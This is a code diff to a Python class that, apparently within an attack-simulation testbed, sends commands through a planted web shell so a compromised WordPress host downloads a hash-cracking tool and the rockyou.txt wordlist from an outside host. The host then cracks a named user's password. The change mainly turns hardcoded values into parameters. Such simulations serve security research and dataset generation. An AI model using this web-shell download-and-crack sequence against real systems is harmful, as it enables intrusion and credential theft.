@@ -513,17 +513,30 @@ class UploadWebShell:
 class WPHashCrack:
     """Transition function uses WP hash cracker to find employee password."""
 
-    def __init__(self, wl_host, attacked_user):
+    def __init__(
+        self,
+        hashcrack_url: str,
+        wl_host: str,
+        attacked_user: str,
+        tar_name: str = None,
+        cmd_param: str = "wp_meta",
+        verify: bool = False,
+        timeout: Optional[float] = None,
+        sleep_time: float = 3.0,
+    ):
         """
         Args:
             wl_host: address of the host where wordlist is available.
             attacked_user: the name of the WP user to crack the password.
         """
-        self.url = (
-            "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz"
-        )
+        self.url = hashcrack_url
         self.wl_host = wl_host
         self.attacked_user = attacked_user
+        self.tar_name = tar_name
+        self.cmd_param = cmd_param
+        self.verify = verify
+        self.timeout = timeout
+        self.sleep_time = sleep_time
 
     def __call__(
         self,
@@ -540,29 +553,57 @@ class WPHashCrack:
             web_shell=web_shell,
         )
         if web_shell is not None:
-            log.info("Download WPHashCrack")
-            output = send_request(
-                log, web_shell, ["wget", self.url], "wp_meta", False, None
-            )
-            sleep(3)
+            log.info("Running WPHashCrack")
+            if self.tar_name is None:
+                output = send_request(
+                    log,
+                    web_shell,
+                    ["wget", self.url],
+                    self.cmd_param,
+                    self.verify,
+                    self.timeout,
+                )
+            else:
+                output = send_request(
+                    log,
+                    web_shell,
+                    ["wget", "-O", self.tar_name, self.url],
+                    self.cmd_param,
+                    self.verify,
+                    self.timeout,
+                )
+            sleep(self.sleep_time)
             log.info("Web shell command response", output=output)
-            log.info("Extract WPHashCrack")
-            output = send_request(
-                log, web_shell, ["tar", "xvfz", "v0.1.tar.gz"], "wp_meta", False, None
-            )
-            sleep(3)
+            if self.tar_name is None:
+                output = send_request(
+                    log,
+                    web_shell,
+                    ["tar", "xvfz", "v0.1.tar.gz"],
+                    self.cmd_param,
+                    self.verify,
+                    self.timeout,
+                )
+            else:
+                output = send_request(
+                    log,
+                    web_shell,
+                    ["tar", "xvfz", self.tar_name],
+                    self.cmd_param,
+                    self.verify,
+                    self.timeout,
+                )
+            sleep(self.sleep_time)
             log.info("Web shell command response", output=output)
             output = send_request(
                 log,
                 web_shell,
                 ["wget", "http://" + self.wl_host + "/rockyou.txt"],
-                "wp_meta",
-                False,
-                None,
+                self.cmd_param,
+                self.verify,
+                self.timeout,
             )
-            sleep(3)
+            sleep(self.sleep_time)
             log.info("Web shell command response", output=output)
-            log.info("Download password list")
             output = send_request(
                 log,
                 web_shell,
@@ -575,13 +616,13 @@ class WPHashCrack:
                     "-u",
                     self.attacked_user,
                 ],
-                "wp_meta",
-                False,
-                None,
+                self.cmd_param,
+                self.verify,
+                self.timeout,
             )
-            sleep(3)
+            sleep(self.sleep_time)
             log.info("Web shell command response", output=output)
-            log.info("Start WPHashCrack")
+            log.info("Finished WPHashCrack")
         else:
             log.error("Missing web shell url")
             raise Exception("No web shell to execute at")
